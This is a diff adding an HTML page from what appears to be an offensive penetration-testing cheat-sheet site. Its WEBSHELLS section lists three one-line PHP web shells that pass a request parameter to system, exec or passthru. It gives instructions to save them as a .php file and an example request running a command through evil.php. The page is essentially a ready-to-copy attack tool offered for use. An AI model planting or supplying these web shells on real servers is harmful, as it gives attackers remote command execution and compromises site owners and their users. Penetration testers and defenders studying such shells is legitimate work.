@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<link rel="icon" type="image/x-icon" href="https://gitlab.com/uploads/-/system/project/avatar/40927563/edb-spider-orange.png">
+<link rel="stylesheet" type="text/css" href="/machete/conf/machete_style_offensive_sections.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+	<script>
+		function ctrl_C(element) {
+  		var $temp = $("<input>");
+  		$("body").append($temp);
+  		$temp.val($(element).text()).select();
+  		document.execCommand("copy");
+  		$temp.remove();
+		alert("copied to clipboard.");
+	}	
+	</script>
+  <title> M A C H E T E </title>
+  <!--------------------->
+  <!-- b0ydC Founder -->
+  <!-- --------------- -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8" />
+
+</head>
+<body>
+<pre><center>
+<a href="/machete/index.html" style="text-decoration:none;">
+
+   ▄▄▄▄███▄▄▄▄      ▄████████  ▄████████    ▄█    █▄       ▄████████     ███        ▄████████ 
+ ▄██▀▀▀███▀▀▀██▄   ███    ███ ███    ███   ███    ███     ███    ███ ▀█████████▄   ███    ███ 
+ ███   ███   ███   ███    ███ ███    █▀    ███    ███     ███    █▀     ▀███▀▀██   ███    █▀  
+ ███   ███   ███   ███    ███ ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄         ███   ▀  ▄███▄▄▄     
+ ███   ███   ███ ▀███████████ ███        ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀         ███     ▀▀███▀▀▀     
+ ███   ███   ███   ███    ███ ███    █▄    ███    ███     ███    █▄      ███       ███    █▄  
+ ███   ███   ███   ███    ███ ███    ███   ███    ███     ███    ███     ███       ███    ███ 
+  ▀█   ███   █▀    ███    █▀  ████████▀    ███    █▀      ██████████    ▄████▀     ██████████ 
+                                                                                              
+                                      
+</a></pre>
+<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
+    <a href="/machete/offensive.html">OFFENSIVE</a> |
+    <a href="/machete/defensive.html">DEFENSIVE</a> |
+    <a href="/machete/tools.html">TOOLS</a> |
+    <a href="/machete/about.html">ABOUT</a> 
+</div> 
+
+<p class="titulos"><mark>[WEBSHELLS]</mark></p>
+<div>
+<button onclick="document.location='/machete/offensive/web_penetration_testing/tools_usage.html'">GO BACK</button>
+<pre><div class="column" style="display: inline-block; text-align: left; background-color:gray;">
+
+<b>NOTES:</b> 
+
+1. save code as .php file
+
+<b>W1: </b><p id="ws01"><mark><?php system($_GET["cmd"]); ?></mark></p>
+<b>W2: </b><p id="ws02"><mark><?php echo exec($_POST['cmd']); ?></mark></p>
+<b>W3: </b><p id="ws03"><mark><?php echo passthru($_GET['cmd']); ?></mark></p>
+
+<b>USAGE:</b> http://ip_addr/evil.php?cmd=id <br>
+*suppose the file was saved as evil.php
+  
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#ws01')">.W1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#ws02')">.W2.</button> |<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#ws03')">.W3.</button>
+  
+</div>
+</pre>
+<button onclick="document.location='/machete/offensive/web_penetration_testing/tools_usage.html'">GO BACK</button>
+</div>
+<p class="titulos">©® - 2023.</p>
+</center>
+</body>
+</html>
